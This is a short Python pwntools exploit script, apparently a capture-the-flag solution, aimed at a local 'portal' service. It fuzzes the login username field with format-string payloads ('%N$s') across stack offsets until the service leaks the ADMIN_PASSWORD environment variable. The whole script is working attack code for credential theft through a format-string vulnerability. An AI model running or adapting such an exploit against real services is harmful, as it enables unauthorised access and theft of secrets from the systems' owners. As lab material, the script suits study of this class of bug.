from pwn import *

context.log_level = 'error'

def get_io():
	# return process("./portal")
	return remote("localhost", 8000)

def login(io, username, password=None):
	io.sendlineafter(b">> ", b"1")
	io.sendlineafter(b"Username: ", str(username).encode())
	if password: io.sendlineafter(b"Password: ", str(password).encode())

def fuzz():
	found = False
	for i in range(1, 250):
		try:
			io = get_io()
			login(io, f"%{i}$s")
			buf = io.recvline()
			print(i, buf)
			if b'ADMIN_PASSWORD' in buf:
				print(f"Found env at: {i} => {buf}")
				found = True
				break
		except: pass
	if not found:
		print("Couldn't find the ADMIN_PASSWORD env.")

fuzz()
